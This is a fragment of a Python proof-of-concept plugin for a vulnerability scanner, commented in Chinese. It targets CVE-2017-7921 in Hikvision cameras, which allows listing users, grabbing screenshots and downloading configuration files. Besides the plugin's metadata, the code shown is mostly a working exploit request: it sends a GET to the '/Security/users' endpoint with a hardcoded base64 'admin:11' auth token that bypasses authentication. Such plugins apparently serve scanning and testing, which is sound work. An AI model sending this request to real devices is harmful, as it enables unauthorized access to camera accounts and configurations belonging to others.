...
def vuln_info():
    info = {
        'vuln_name': 'Hikvision漏洞',  # 漏洞名称
        'vuln_referer': 'https://blog.csdn.net/qq_46527139/article/details/111565277',  # 漏洞来源
        'vuln_author': 'YaoXin',  # 插件作者
        'cms_name': 'test',  # cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description': '''漏洞描述：通过构造url进行检索所有用户、屏幕截图、配置文件下载。''',
        'vuln_identifier': '''漏洞编号：CVE-2017-7921''',
        'vuln_class': '漏洞分类',
...
def do_poc(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    headers = {
    ...
    try:
        ...
        ###########################################################################################################
        res = requests.get(url=url+"/Security/users?auth=YWRtaW46MTEK",headers=headers,timeout=2)
